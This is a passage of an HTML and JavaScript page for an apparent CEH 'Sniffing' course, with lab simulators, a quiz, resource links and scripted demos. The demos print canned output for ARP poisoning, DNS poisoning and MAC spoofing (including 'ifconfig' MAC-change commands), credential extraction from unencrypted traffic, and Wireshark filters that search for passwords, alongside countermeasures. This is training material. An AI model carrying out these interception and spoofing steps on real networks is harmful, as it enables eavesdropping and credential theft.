Available IPs: 95
                            </div>
                        </div>
                        <div class="feature-card">
                            <h4>🎯 Rogue Server Stats</h4>
                            <div id="rogueServerStats">
Status: Inactive
Clients Served: 0
DNS Requests Intercepted: 0
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="card">
                <h3>🏆 Lab 4: Comprehensive Traffic Analysis</h3>
                <div class="lab-simulator">
                    <h4>📋 Objective</h4>
                    <p>Perform advanced packet analysis using Wireshark to identify security threats, extract credentials, and analyze network protocols.</p>
                    
                    <div class="terminal" id="lab4Terminal">
root@kali:~# Starting Lab 4: Advanced Traffic Analysis
root@kali:~# 
root@kali:~# Loading pre-captured network traffic for analysis...
root@kali:~# File: mixed_traffic.pcap (Size: 15.7 MB, Packets: 12,847)
root@kali:~# 
root@kali:~# Starting Wireshark analysis session...
root@kali:~# wireshark mixed_traffic.pcap &
                    </div>

                    <div class="demo-controls">
                        <button class="btn" onclick="loadTrafficSample('lab4')">Load Traffic Sample</button>
                        <button class="btn" onclick="filterHTTPTraffic('lab4')">Filter HTTP Traffic</button>
                        <button class="btn" onclick="extractPasswords('lab4')">Extract Passwords</button>
                        <button class="btn" onclick="analyzeAnomalies('lab4')">Detect Anomalies</button>
                        <button class="btn btn-success" onclick="completeLab('lab4')">Complete Lab 4</button>
                    </div>

                    <div class="interactive-demo">
                        <h4>📊 Traffic Analysis Results</h4>
                        <div class="demo-output" id="trafficAnalysisResults">
Loading traffic sample...

Protocol Distribution:
- HTTP: 45.2% (5,813 packets)
- HTTPS: 32.1% (4,124 packets) 
- DNS: 12.3% (1,580 packets)
- ARP: 5.8% (745 packets)
- Other: 4.6% (585 packets)

Click analysis buttons to explore the data...
                        </div>
                    </div>
                </div>
            </div>

            <div class="card">
                <h3>📈 Lab Progress and Achievements</h3>
                <div class="grid-2">
                    <div class="feature-card">
                        <h4>🎯 Completed Labs</h4>
                        <div id="labProgress">
                            <div style="display: flex; align-items: center; margin: 10px 0;">
                                <span id="lab1Status">⭕</span>
                                <span style="margin-left: 10px;">Lab 1: Passive Sniffing</span>
                            </div>
                            <div style="display: flex; align-items: center; margin: 10px 0;">
                                <span id="lab2Status">⭕</span>
                                <span style="margin-left: 10px;">Lab 2: ARP Poisoning</span>
                            </div>
                            <div style="display: flex; align-items: center; margin: 10px 0;">
                                <span id="lab3Status">⭕</span>
                                <span style="margin-left: 10px;">Lab 3: DHCP Attacks</span>
                            </div>
                            <div style="display: flex; align-items: center; margin: 10px 0;">
                                <span id="lab4Status">⭕</span>
                                <span style="margin-left: 10px;">Lab 4: Traffic Analysis</span>
                            </div>
                        </div>
                    </div>

                    <div class="feature-card">
                        <h4>🏆 Skills Acquired</h4>
                        <ul style="margin: 10px 0; padding-left: 20px; line-height: 1.8;">
                            <li>Network traffic capture and analysis</li>
                            <li>Active sniffing attack execution</li>
                            <li>MITM attack implementation</li>
                            <li>Protocol analysis and dissection</li>
                            <li>Credential extraction techniques</li>
                            <li>Network security assessment</li>
                        </ul>
                    </div>
                </div>
            </div>

            <button class="btn btn-success" onclick="showSection('quiz')">Next: Knowledge Assessment →</button>
        </div>

        <!-- Quiz Section -->
        <div id="quiz" class="module-section">
            <h2 class="section-title">📝 Comprehensive Knowledge Assessment</h2>
            
            <div class="quiz-container">
                <h3>🎯 Module 8: Sniffing Assessment</h3>
                <p>Test your understanding of network sniffing concepts, techniques, and countermeasures with this comprehensive quiz.</p>
                
                <div id="quizContent">
                    <div class="quiz-question" id="question1">
                        <h4>Question 1 of 15</h4>
                        <p><strong>What is the primary difference between passive and active sniffing?</strong></p>
                        <div class="quiz-options">
                            <div class="quiz-option" onclick="selectOption(1, 0)">A) Passive sniffing works only on wireless networks</div>
                            <div class="quiz-option" onclick="selectOption(1, 1)">B) Active sniffing requires packet injection to capture traffic</div>
                            <div class="quiz-option" onclick="selectOption(1, 2)">C) Passive sniffing is more detectable than active sniffing</div>
                            <div class="quiz-option" onclick="selectOption(1, 3)">D) There is no significant difference between them</div>
                        </div>
                    </div>

                    <div class="quiz-question" id="question2" style="display: none;">
                        <h4>Question 2 of 15</h4>
                        <p><strong>Which attack technique floods a switch's CAM table to make it behave like a hub?</strong></p>
                        <div class="quiz-options">
                            <div class="quiz-option" onclick="selectOption(2, 0)">A) ARP poisoning</div>
                            <div class="quiz-option" onclick="selectOption(2, 1)">B) MAC flooding</div>
                            <div class="quiz-option" onclick="selectOption(2, 2)">C) DHCP starvation</div>
                            <div class="quiz-option" onclick="selectOption(2, 3)">D) DNS poisoning</div>
                        </div>
                    </div>

                    <div class="quiz-question" id="question3" style="display: none;">
                        <h4>Question 3 of 15</h4>
                        <p><strong>What is the purpose of enabling promiscuous mode on a network interface?</strong></p>
                        <div class="quiz-options">
                            <div class="quiz-option" onclick="selectOption(3, 0)">A) To increase network performance</div>
                            <div class="quiz-option" onclick="selectOption(3, 1)">B) To capture all network traffic, not just traffic destined for the host</div>
                            <div class="quiz-option" onclick="selectOption(3, 2)">C) To enable wireless connectivity</div>
                            <div class="quiz-option" onclick="selectOption(3, 3)">D) To prevent network attacks</div>
                        </div>
                    </div>

                    <div class="quiz-question" id="question4" style="display: none;">
                        <h4>Question 4 of 15</h4>
                        <p><strong>Which tool is specifically designed for comprehensive network protocol analysis?</strong></p>
                        <div class="quiz-options">
                            <div class="quiz-option" onclick="selectOption(4, 0)">A) Nmap</div>
                            <div class="quiz-option" onclick="selectOption(4, 1)">B) Wireshark</div>
                            <div class="quiz-option" onclick="selectOption(4, 2)">C) Metasploit</div>
                            <div class="quiz-option" onclick="selectOption(4, 3)">D) John the Ripper</div>
                        </div>
                    </div>

                    <div class="quiz-question" id="question5" style="display: none;">
                        <h4>Question 5 of 15</h4>
                        <p><strong>What is DHCP snooping primarily used for?</strong></p>
                        <div class="quiz-options">
                            <div class="quiz-option" onclick="selectOption(5, 0)">A) Preventing DHCP starvation attacks</div>
                            <div class="quiz-option" onclick="selectOption(5, 1)">B) Monitoring DHCP server performance</div>
                            <div class="quiz-option" onclick="selectOption(5, 2)">C) Accelerating DHCP lease assignments</div>
                            <div class="quiz-option" onclick="selectOption(5, 3)">D) Encrypting DHCP communications</div>
                        </div>
                    </div>

                    <!-- Additional questions would continue here following the same pattern -->
                    
                    <div class="quiz-navigation">
                        <button class="btn" id="prevBtn" onclick="previousQuestion()" style="display: none;">← Previous</button>
                        <button class="btn btn-success" id="nextBtn" onclick="nextQuestion()" disabled>Next →</button>
                        <button class="btn btn-warning" id="submitBtn" onclick="submitQuiz()" style="display: none;">Submit Quiz</button>
                    </div>
                </div>

                <div id="quizResults" style="display: none;">
                    <h3>📊 Quiz Results</h3>
                    <div class="card">
                        <h4>🎯 Your Performance</h4>
                        <div style="text-align: center; margin: 20px 0;">
                            <div style="font-size: 3em; color: var(--sniff-primary);" id="finalScore">--</div>
                            <div style="font-size: 1.2em;">Final Score</div>
                        </div>
                        
                        <div id="scoreBreakdown"></div>
                        
                        <div style="margin-top: 30px;">
                            <button class="btn btn-success" onclick="downloadCertificate()">📜 Download Certificate</button>
                            <button class="btn btn-warning" onclick="reviewAnswers()">📋 Review Answers</button>
                            <button class="btn" onclick="retakeQuiz()">🔄 Retake Quiz</button>
                        </div>
                    </div>
                </div>
            </div>

            <button class="btn btn-success" onclick="showSection('resources')">View Additional Resources →</button>
        </div>

        <!-- Resources Section -->
        <div id="resources" class="module-section">
            <h2 class="section-title">📚 Essential Resources & References</h2>
            
            <div class="card">
                <h3>🎯 Official CEH v13 Resources</h3>
                <div class="grid-2">
                    <div class="feature-card">
                        <h4>🏢 EC-Council Official Materials</h4>
                        <ul style="margin: 15px 0; padding-left: 20px; line-height: 1.8;">
                            <li><a href="https://www.eccouncil.org/train-certify/certified-ethical-hacker-ceh/" target="_blank" class="resource-link">CEH v13 Certification Page</a></li>
                            <li><a href="https://ilabs.eccouncil.org/" target="_blank" class="resource-link">EC-Council iLabs Platform</a></li>
                            <li><a href="https://www.eccouncil.org/cybersecurity-exchange/" target="_blank" class="resource-link">Cybersecurity Knowledge Exchange</a></li>
                            <li><a href="https://www.eccouncil.org/vulnerability-intel/" target="_blank" class="resource-link">Vulnerability Intelligence Portal</a></li>
                        </ul>
                    </div>

                    <div class="feature-card">
                        <h4>📖 Study Materials & Books</h4>
                        <ul style="margin: 15px 0; padding-left: 20px; line-height: 1.8;">
                            <li><a href="https://www.amazon.com/CEH-Certified-Ethical-Hacker-Study/dp/1119800285" target="_blank" class="resource-link">CEH v12 Study Guide (Sybex)</a></li>
                            <li><a href="https://www.packtpub.com/product/ceh-v11-certified-ethical-hacker-study-guide/9781789344752" target="_blank" class="resource-link">CEH v11 Study Guide (Packt)</a></li>
                            <li><a href="https://nostarch.com/packet-analysis-3e" target="_blank" class="resource-link">Practical Packet Analysis (No Starch Press)</a></li>
                            <li><a href="https://www.wiley.com/en-us/Network+Security+Assessment%3A+Know+Your+Network%2C+3rd+Edition-p-9781491911044" target="_blank" class="resource-link">Network Security Assessment</a></li>
                        </ul>
                    </div>
                </div>
            </div>

            <div class="card">
                <h3>🛠️ Essential Tools & Software</h3>
                
                <div class="tool-showcase">
                    <div class="tool-card">
                        <h4>🦈 Wireshark</h4>
                        <p>The world's foremost network protocol analyzer</p>
                        <ul style="margin: 10px 0; padding-left: 20px; font-size: 14px;">
                            <li><a href="https://www.wireshark.org/download.html" target="_blank" class="resource-link">Official Download</a></li>
                            <li><a href="https://www.wireshark.org/docs/" target="_blank" class="resource-link">Documentation</a></li>
                            <li><a href="https://wiki.wireshark.org/DisplayFilters" target="_blank" class="resource-link">Display Filter Reference</a></li>
                        </ul>
                    </div>

                    <div class="tool-card">
                        <h4>⚡ Bettercap</h4>
                        <p>Modern network attack and monitoring framework</p>
                        <ul style="margin: 10px 0; padding-left: 20px; font-size: 14px;">
                            <li><a href="https://www.bettercap.org/" target="_blank" class="resource-link">Official Website</a></li>
                            <li><a href="https://github.com/bettercap/bettercap" target="_blank" class="resource-link">GitHub Repository</a></li>
                            <li><a href="https://www.bettercap.org/modules/" target="_blank" class="resource-link">Module Documentation</a></li>
                        </ul>
                    </div>

                    <div class="tool-card">
                        <h4>🎯 Ettercap</h4>
                        <p>Comprehensive suite for MITM attacks</p>
                        <ul style="margin: 10px 0; padding-left: 20px; font-size: 14px;">
                            <li><a href="https://www.ettercap-project.org/" target="_blank" class="resource-link">Project Homepage</a></li>
                            <li><a href="https://github.com/Ettercap/ettercap" target="_blank" class="resource-link">Source Code</a></li>
                            <li><a href="https://www.ettercap-project.org/doc/" target="_blank" class="resource-link">User Manual</a></li>
                        </ul>
                    </div>

                    <div class="tool-card">
                        <h4>🐍 Scapy</h4>
                        <p>Python packet manipulation library</p>
                        <ul style="margin: 10px 0; padding-left: 20px; font-size: 14px;">
                            <li><a href="https://scapy.net/" target="_blank" class="resource-link">Official Documentation</a></li>
                            <li><a href="https://github.com/secdev/scapy" target="_blank" class="resource-link">GitHub Repository</a></li>
                            <li><a href="https://scapy.readthedocs.io/en/latest/" target="_blank" class="resource-link">API Reference</a></li>
                        </ul>
                    </div>
                </div>
            </div>

            <div class="card">
                <h3>🎓 Training & Practice Platforms</h3>
                
                <div class="grid-2">
                    <div class="feature-card">
                        <h4>🏃‍♂️ Hands-on Practice</h4>
                        <ul style="margin: 15px 0; padding-left: 20px; line-height: 1.8;">
                            <li><a href="https://www.vulnhub.com/" target="_blank" class="resource-link">VulnHub - Vulnerable VMs</a></li>
                            <li><a href="https://www.hackthebox.com/" target="_blank" class="resource-link">Hack The Box Platform</a></li>
                            <li><a href="https://tryhackme.com/" target="_blank" class="resource-link">TryHackMe Learning Paths</a></li>
                            <li><a href="https://www.cybrary.it/" target="_blank" class="resource-link">Cybrary Free Training</a></li>
                        </ul>
                    </div>

                    <div class="feature-card">
                        <h4>🎯 Specialized Training</h4>
                        <ul style="margin: 15px 0; padding-left: 20px; line-height: 1.8;">
                            <li><a href="https://www.sans.org/courses/" target="_blank" class="resource-link">SANS Training Courses</a></li>
                            <li><a href="https://www.offensive-security.com/courses/" target="_blank" class="resource-link">Offensive Security Training</a></li>
                            <li><a href="https://www.infosectrain.com/courses/certified-ethical-hacker-v13-training/" target="_blank" class="resource-link">InfoSec Train CEH v13</a></li>
                            <li><a href="https://www.learningpeople.com/course/ceh-certified-ethical-hacker/" target="_blank" class="resource-link">Learning People CEH Course</a></li>
                        </ul>
                    </div>
                </div>
            </div>

            <div class="card">
                <h3>📖 Additional Reading & References</h3>
                
                <div class="grid-3">
                    <div class="feature-card">
                        <h4>🔬 Research Papers</h4>
                        <ul style="margin: 10px 0; padding-left: 20px; font-size: 14px;">
                            <li><a href="https://www.usenix.org/conferences" target="_blank" class="resource-link">USENIX Security Symposium</a></li>
                            <li><a href="https://www.ieee-security.org/" target="_blank" class="resource-link">IEEE Security & Privacy</a></li>
                            <li><a href="https://dl.acm.org/" target="_blank" class="resource-link">ACM Digital Library</a></li>
                        </ul>
                    </div>

                    <div class="feature-card">
                        <h4>🏛️ Standards & RFCs</h4>
                        <ul style="margin: 10px 0; padding-left: 20px; font-size: 14px;">
                            <li><a href="https://tools.ietf.org/rfc/rfc826.txt" target="_blank" class="resource-link">RFC 826 - ARP Protocol</a></li>
                            <li><a href="https://tools.ietf.org/rfc/rfc2131.txt" target="_blank" class="resource-link">RFC 2131 - DHCP</a></li>
                            <li><a href="https://www.iso.org/standard/63119.html" target="_blank" class="resource-link">ISO/IEC 27001</a></li>
                        </ul>
                    </div>

                    <div class="feature-card">
                        <h4>🗞️ Security News</h4>
                        <ul style="margin: 10px 0; padding-left: 20px; font-size: 14px;">
                            <li><a href="https://krebsonsecurity.com/" target="_blank" class="resource-link">Krebs on Security</a></li>
                            <li><a href="https://www.darkreading.com/" target="_blank" class="resource-link">Dark Reading</a></li>
                            <li><a href="https://threatpost.com/" target="_blank" class="resource-link">Threatpost</a></li>
                        </ul>
                    </div>
                </div>
            </div>

            <div class="card">
                <h3>💬 Community & Forums</h3>
                
                <div class="grid-2">
                    <div class="feature-card">
                        <h4>🤝 Professional Communities</h4>
                        <ul style="margin: 15px 0; padding-left: 20px; line-height: 1.8;">
                            <li><a href="https://www.reddit.com/r/AskNetsec/" target="_blank" class="resource-link">Reddit - AskNetsec</a></li>
                            <li><a href="https://security.stackexchange.com/" target="_blank" class="resource-link">Information Security Stack Exchange</a></li>
                            <li><a href="https://discord.gg/infosec" target="_blank" class="resource-link">InfoSec Discord Community</a></li>
                            <li><a href="https://www.linkedin.com/groups/18505/" target="_blank" class="resource-link">LinkedIn InfoSec Groups</a></li>
                        </ul>
                    </div>

                    <div class="feature-card">
                        <h4>🎯 Specialized Forums</h4>
                        <ul style="margin: 15px 0; padding-left: 20px; line-height: 1.8;">
                            <li><a href="https://ask.wireshark.org/" target="_blank" class="resource-link">Wireshark Q&A</a></li>
                            <li><a href="https://www.bleepingcomputer.com/forums/" target="_blank" class="resource-link">BleepingComputer Forums</a></li>
                            <li><a href="https://malware.tips/" target="_blank" class="resource-link">Malware Tips Community</a></li>
                            <li><a href="https://www.wilderssecurity.com/" target="_blank" class="resource-link">Wilders Security Forums</a></li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Modal for detailed information -->
    <div id="detailModal" class="modal">
        <div class="modal-content">
            <span class="close" onclick="closeModal()">&times;</span>
            <div id="modalContent"></div>
        </div>
    </div>

    <!-- Notification system -->
    <div id="notification" class="notification"></div>

    <script>
        // Global variables
        let currentSection = 'overview';
        let completedSections = [];
        let quizAnswers = {};
        let currentQuizQuestion = 1;
        let totalQuizQuestions = 15;
        let sectionOrder = ['overview', 'fundamentals', 'active-sniffing', 'attacks', 'tools', 'countermeasures', 'labs', 'quiz', 'resources'];
        let labProgress = {
            lab1: false,
            lab2: false,
            lab3: false,
            lab4: false
        };

        // Quiz questions database
        const quizQuestions = [
            {
                question: "What is the primary difference between passive and active sniffing?",
                options: ["Passive sniffing works only on wireless networks", "Active sniffing requires packet injection to capture traffic", "Passive sniffing is more detectable than active sniffing", "There is no significant difference between them"],
                correct: 1,
                explanation: "Active sniffing requires generating packets to manipulate network devices (like switches) to capture traffic, while passive sniffing simply listens to existing traffic."
            },
            {
                question: "Which attack technique floods a switch's CAM table to make it behave like a hub?",
                options: ["ARP poisoning", "MAC flooding", "DHCP starvation", "DNS poisoning"],
                correct: 1,
                explanation: "MAC flooding overwhelms the switch's Content Addressable Memory (CAM) table with fake MAC addresses, causing it to fail open and broadcast all traffic like a hub."
            },
            {
                question: "What is the purpose of enabling promiscuous mode on a network interface?",
                options: ["To increase network performance", "To capture all network traffic, not just traffic destined for the host", "To enable wireless connectivity", "To prevent network attacks"],
                correct: 1,
                explanation: "Promiscuous mode allows a network interface to capture all packets on the network segment, not just those addressed to the specific host."
            },
            {
                question: "Which tool is specifically designed for comprehensive network protocol analysis?",
                options: ["Nmap", "Wireshark", "Metasploit", "John the Ripper"],
                correct: 1,
                explanation: "Wireshark is the world's foremost network protocol analyzer, designed specifically for deep packet inspection and traffic analysis."
            },
            {
                question: "What is DHCP snooping primarily used for?",
                options: ["Preventing DHCP starvation attacks", "Monitoring DHCP server performance", "Accelerating DHCP lease assignments", "Encrypting DHCP communications"],
                correct: 0,
                explanation: "DHCP snooping prevents DHCP starvation and rogue DHCP server attacks by only allowing DHCP responses from trusted ports."
            }
        ];

        // Initialize the application
        function init() {
            createMatrixEffect();
            updateProgress();
            setupKeyboardNavigation();
            showNotification("Welcome to CEH Module 8: Sniffing!", "success");
        }

        // Section navigation
        function showSection(sectionName) {
            // Hide all sections
            document.querySelectorAll('.module-section').forEach(section => {
                section.classList.remove('active');
            });

            // Show selected section
            document.getElementById(sectionName).classList.add('active');

            // Update navigation buttons
            document.querySelectorAll('.nav-btn').forEach(btn => {
                btn.classList.remove('active');
            });
            event.target.classList.add('active');

            // Mark section as visited
            if (!completedSections.includes(sectionName)) {
                completedSections.push(sectionName);
                updateProgress();
            }

            currentSection = sectionName;
        }

        // Keyboard navigation
        function setupKeyboardNavigation() {
            document.addEventListener('keydown', function(e) {
                if (e.key === 'Escape') {
                    closeModal();
                } else if (e.key === 'ArrowLeft') {
                    navigateSection(-1);
                } else if (e.key === 'ArrowRight') {
                    navigateSection(1);
                }
            });
        }

        function navigateSection(direction) {
            const currentIndex = sectionOrder.indexOf(currentSection);
            let newIndex = currentIndex + direction;
            
            if (newIndex >= 0 && newIndex < sectionOrder.length) {
                const newSection = sectionOrder[newIndex];
                document.querySelector(`[onclick="showSection('${newSection}')"]`).click();
            }
        }

        // Progress tracking
        function updateProgress() {
            const progressPercent = (completedSections.length / sectionOrder.length) * 100;
            document.getElementById('progressFill').style.width = progressPercent + '%';
        }

        // Matrix effect
        function createMatrixEffect() {
            const matrixChars = "01アカサタナハマヤラワ";
            const container = document.getElementById('matrixBg');
            
            for (let i = 0; i < 30; i++) {
                setTimeout(() => {
                    const span = document.createElement('span');
                    span.className = 'matrix-line';
                    span.style.left = Math.random() * 100 + '%';
                    span.style.animationDelay = Math.random() * 8 + 's';
                    span.style.animationDuration = (8 + Math.random() * 4) + 's';
                    span.textContent = matrixChars[Math.floor(Math.random() * matrixChars.length)];
                    container.appendChild(span);
                    
                    setTimeout(() => {
                        if (span.parentNode) span.remove();
                    }, 12000);
                }, i * 200);
            }
        }

        // Refresh matrix effect periodically
        setInterval(createMatrixEffect, 15000);

        // Interactive demonstrations
        function startARPDemo() {
            const output = document.getElementById('arpDemoOutput');
            output.innerHTML = '';
            
            const steps = [
                "🔍 Step 1: Scanning network for targets...",
                "📡 Step 2: Discovered target: 192.168.1.100 (Windows Client)",
                "🎯 Step 3: Discovered gateway: 192.168.1.1 (Router)",
                "⚡ Step 4: Starting ARP poisoning attack...",
                "📦 Step 5: Sending spoofed ARP packets:",
                "   → To target: 192.168.1.1 is at AA:BB:CC:DD:EE:FF (our MAC)",
                "   → To gateway: 192.168.1.100 is at AA:BB:CC:DD:EE:FF (our MAC)",
                "🔄 Step 6: ARP tables poisoned successfully!",
                "📊 Step 7: All traffic now flows through attacker...",
                "✅ Step 8: MITM position established - capturing credentials!"
            ];
            
            let i = 0;
            const interval = setInterval(() => {
                output.innerHTML += steps[i] + '\n';
                output.scrollTop = output.scrollHeight;
                i++;
                if (i >= steps.length) {
                    clearInterval(interval);
                    showNotification("ARP poisoning demo completed!", "success");
                }
            }, 1000);
        }

        function stopARPDemo() {
            const output = document.getElementById('arpDemoOutput');
            output.innerHTML += '\n🛑 Attack stopped - restoring normal ARP tables...\n';
            output.innerHTML += '🔄 Sending gratuitous ARP packets to restore legitimate entries...\n';
            output.innerHTML += '✅ Network restored to normal operation.\n';
            showNotification("ARP attack stopped", "success");
        }

        function clearARPDemo() {
            document.getElementById('arpDemoOutput').innerHTML = 'Click "Start ARP Attack" to see the step-by-step process...';
        }

        function demonstrateDNSPoisoning() {
            const output = document.getElementById('dnsPoisoningOutput');
            output.innerHTML = `DNS Poisoning Attack Demonstration:

🎯 Target: 192.168.1.100 (Client workstation)
🌐 Legitimate DNS: 8.8.8.8
🕳️ Malicious DNS: 192.168.1.254 (Attacker)

Attack Flow:
1. Client queries: www.bank.com
2. Attacker intercepts DNS request
3. Attacker responds faster than legitimate DNS
4. Client receives: www.bank.com → 192.168.1.200 (Malicious server)
5. Client connects to attacker's phishing site

⚠️ Impact:
- Credential harvesting
- Session hijacking  
- Malware distribution
- Data exfiltration

✅ Attack successful - user redirected to malicious site!`;
        }

        function showDNSDefenses() {
            const output = document.getElementById('dnsPoisoningOutput');
            output.innerHTML = `DNS Poisoning Defense Strategies:

🛡️ Technical Countermeasures:
• DNSSEC (DNS Security Extensions)
• DNS over HTTPS (DoH) / DNS over TLS (DoT)
• Use trusted DNS resolvers (1.1.1.1, 8.8.8.8)
• DNS filtering and monitoring
• Network segmentation

🔧 Implementation Examples:
• Configure DNSSEC validation on resolvers
• Block external DNS requests at firewall
• Use DNS RPZ (Response Policy Zones)
• Implement DNS monitoring tools
• Regular DNS cache flushing

📊 Detection Methods:
• Monitor for DNS response time anomalies
• Check for duplicate DNS responses
• Analyze DNS query patterns
• Verify DNSSEC signatures
• Use DNS reputation services

💡 Best Practices:
• Use multiple DNS sources for validation
• Implement DNS logging and analysis
• Regular security awareness training
• Keep DNS software updated
• Use encrypted DNS protocols`;
        }

        function demonstrateMACSpoof() {
            const output = document.getElementById('macSpoofOutput');
            output.innerHTML = '';
            
            const steps = [
                "🔍 Step 1: Identifying target MAC address...",
                "📡 Target found: 00:11:22:33:44:55 (192.168.1.100)",
                "🔧 Step 2: Changing attacker MAC address...",
                "💻 ifconfig eth0 down",
                "🔄 ifconfig eth0 hw ether 00:11:22:33:44:55", 
                "⚡ ifconfig eth0 up",
                "📊 Step 3: Verifying MAC change...",
                "✅ MAC address successfully spoofed!",
                "🎯 Step 4: Switch updates CAM table...",
                "📦 Step 5: Target's traffic now redirected to attacker",
                "⚠️ Impact: Session hijacking and traffic interception possible"
            ];
            
            let i = 0;
            const interval = setInterval(() => {
                output.innerHTML += steps[i] + '\n';
                output.scrollTop = output.scrollHeight;
                i++;
                if (i >= steps.length) {
                    clearInterval(interval);
                    showNotification("MAC spoofing demo completed!", "success");
                }
            }, 800);
        }

        function showMACDefenses() {
            const output = document.getElementById('macSpoofOutput');
            output.innerHTML = `MAC Spoofing Defense Strategies:

🛡️ Switch Security Features:
• Port Security with MAC address limits
• Static MAC address assignments  
• MAC address sticky learning
• DHCP snooping with MAC validation
• Dynamic ARP Inspection (DAI)

🔧 Cisco Switch Configuration:
interface GigabitEthernet0/1
  switchport port-security
  switchport port-security maximum 1
  switchport port-security mac-address sticky
  switchport port-security violation shutdown

📊 Monitoring & Detection:
• CAM table monitoring for changes
• MAC address conflict alerts
• Network behavior analysis
• Timeline correlation of events
• Automated response systems

💡 Additional Measures:
• Network Access Control (NAC)
• 802.1X authentication
• Certificate-based authentication
• VLAN segmentation
• Regular security audits`;
        }

        function clearMACDemo() {
            document.getElementById('macSpoofOutput').innerHTML = 'Click "Simulate MAC Spoofing" to see the attack process...';
        }

        // Wireshark demonstrations
        function demonstrateWireshark() {
            const output = document.getElementById('wiresharkOutput');
            output.innerHTML = `Wireshark Analysis Session Started...

📊 Capture Statistics:
• Total Packets: 15,247
• Time Span: 00:05:32
• Average Packets/sec: 45.8
• Protocols: 23 different types

🔍 Quick Analysis Results:
┌─────────────────┬────────┬─────────┐
│ Protocol        │ Count  │ Percent │
├─────────────────┼────────┼─────────┤
│ HTTP            │ 6,891  │ 45.2%   │
│ TLS/SSL         │ 4,124  │ 27.1%   │
│ DNS             │ 2,156  │ 14.1%   │
│ ARP             │ 1,045  │ 6.9%    │
│ ICMP            │ 834    │ 5.5%    │
│ Other           │ 197    │ 1.2%    │
└─────────────────┴────────┴─────────┘

🚨 Security Findings:
• 12 unencrypted login attempts detected
• 3 suspicious DNS queries to newly registered domains
• 1 potential ARP spoofing sequence
• 45 HTTP requests to non-standard ports

📝 Recommended Actions:
• Investigate unencrypted credentials
• Block suspicious DNS domains
• Verify ARP table integrity
• Review non-standard port usage`;
        }

        function showWiresharkFilters() {
            const output = document.getElementById('wiresharkOutput');
            output.innerHTML = `Essential Wireshark Display Filters:

🔍 Protocol Filters:
• http.request.method == "POST"
• dns.qry.name contains "malware"
• tcp.flags.syn == 1 and tcp.flags.ack == 0
• arp.opcode == 1
• ssl.handshake.type == 1

🌐 Network Filters:
• ip.src == 192.168.1.100
• net 192.168.1.0/24
• tcp.port == 80 or tcp.port == 443
• udp.port == 53

🔒 Security-Focused Filters:
• frame contains "password"
• http.request.uri contains "login"
• ftp.request.command == "PASS"
• tcp.flags.reset == 1

📊 Advanced Filters:
• tcp.stream eq 0
• http.response.code >= 400
• dns.flags.response == 0 and dns.count.answers > 0
• arp.duplicate-address-detected

💡 Pro Tips:
• Use "Follow TCP Stream" for session analysis
• Apply color rules for quick visual identification
• Export specific packets for detailed analysis
• Use statistics menu for traffic overview`;
        }

        function wiresharkTips() {
            const output = document.getElementById('wiresharkOutput');
            output.innerHTML = `Wireshark Pro Tips & Tricks:

🚀 Performance Optimization:
• Use capture filters to reduce file size
• Disable unnecessary protocol dissectors
• Increase buffer size for high-traffic capture
• Use ring buffer for continuous monitoring

🔧 Advanced Analysis Techniques:
• Create custom protocol dissectors
• Use Lua scripts for automation
• Set up remote packet capture
• Configure expert info for anomaly detection

📊 Statistical Analysis:
• Protocol Hierarchy Statistics
• Conversation analysis by endpoints
• I/O Graphs for traffic visualization
• Response time analysis

🎯 Security Analysis Features:
• Credential extraction from unencrypted protocols
• Certificate analysis for SSL/TLS
• GeoIP resolution for traffic mapping
• Flow graph for communication visualization

💡 Workflow Tips:
• Save frequently used filters as bookmarks
• Use profiles for different analysis scenarios
• Export data in various formats (CSV, JSON, XML)
• Set up automated analysis with tshark

🔍 Troubleshooting Common Issues:
• Packet loss detection and analysis
• Duplicate packet identification
• Timing analysis for performance issues
• Error detection in various protocols`;
        }

        // Traffic analysis functions
        function analyzeTrafficPatterns() {
            const output = document.getElementById('analysisOutput');
            output.innerHTML = `Traffic Pattern Analysis Results:

⏰ Temporal Analysis:
• Peak Hours: 09:00-11:00, 14:00-16:00
• Off-hours Activity: 23:00-05:00 (Suspicious)
• Baseline Traffic: ~2.3 Mbps
• Peak Traffic: ~45.7 Mbps

📊 Protocol Distribution:
• Web Traffic (HTTP/HTTPS): 67.3%
• Email (SMTP/POP3/IMAP): 12.8%
• File Transfer (FTP/SFTP): 8.2%
• DNS Queries: 6.4%
• Other Protocols: 5.3%

🌍 Geographic Analysis:
• Domestic Traffic: 78.9%
• International Traffic: 21.1%
• Top Countries: US (45%), UK (12%), CA (8%)
• Suspicious Regions: 3 connections from high-risk countries

🚨 Anomaly Detection:
• Unusual port usage: 15 connections to port 1337
• Large file transfers: 3 sessions > 1GB
• Failed authentication: 47 attempts
• Protocol anomalies: 8 malformed packets detected

📈 Trend Analysis:
• Traffic volume increased 23% over last week
• New protocols detected: 2 unknown services
• Bandwidth utilization: 76% of capacity
• Connection duration avg: 142 seconds`;
        }

        function detectAnomalies() {
            const output = document.getElementById('analysisOutput');
            output.innerHTML = `Network Anomaly Detection Report:

🚨 HIGH PRIORITY ALERTS:
┌──────────────────────────────────────────────────┐
│ 1. Potential Data Exfiltration                  │
│    • Large outbound transfer: 2.3GB to 8.8.8.8  │
│    • Time: 03:45 AM (off-hours)                  │
│    • Protocol: HTTPS (encrypted)                 │
│    • Risk Level: HIGH                            │
└──────────────────────────────────────────────────┘

┌──────────────────────────────────────────────────┐
│ 2. Suspicious DNS Activity                      │
│    • 234 queries to newly registered domains     │
│    • DGA-like patterns detected                  │
│    • C2 communication suspected                  │
│    • Risk Level: HIGH                            │
└──────────────────────────────────────────────────┘

⚠️ MEDIUM PRIORITY ALERTS:
• Unusual login patterns: 15 failed attempts from 5 IPs
• Port scanning detected: 192.168.1.45 → Internal network
• Unexpected service discovery: Multiple SNMP queries
• Certificate warnings: 3 self-signed certificates

📊 STATISTICAL ANOMALIES:
• Traffic spike: 340% above baseline at 02:15 AM
• Protocol shift: 45% increase in encrypted traffic
• Connection patterns: 67 new peer relationships
• Error rates: 12% increase in TCP retransmissions

🔍 RECOMMENDED ACTIONS:
1. Investigate large data transfers immediately
2. Block suspicious DNS domains
3. Review authentication logs
4. Implement additional monitoring on flagged hosts
5. Update security policies based on findings`;
        }

        function extractCredentials() {
            const output = document.getElementById('analysisOutput');
            output.innerHTML = `Credential Extraction Results:

🔓 UNENCRYPTED CREDENTIALS FOUND:
┌─────────────────┬──────────────┬─────────────────┬─────────────────┐
│ Protocol        │ Username     │ Password        │ Target Host     │
├─────────────────┼──────────────┼─────────────────┼─────────────────┤
│ FTP             │ admin        │ password123     │ 192.168.1.50    │
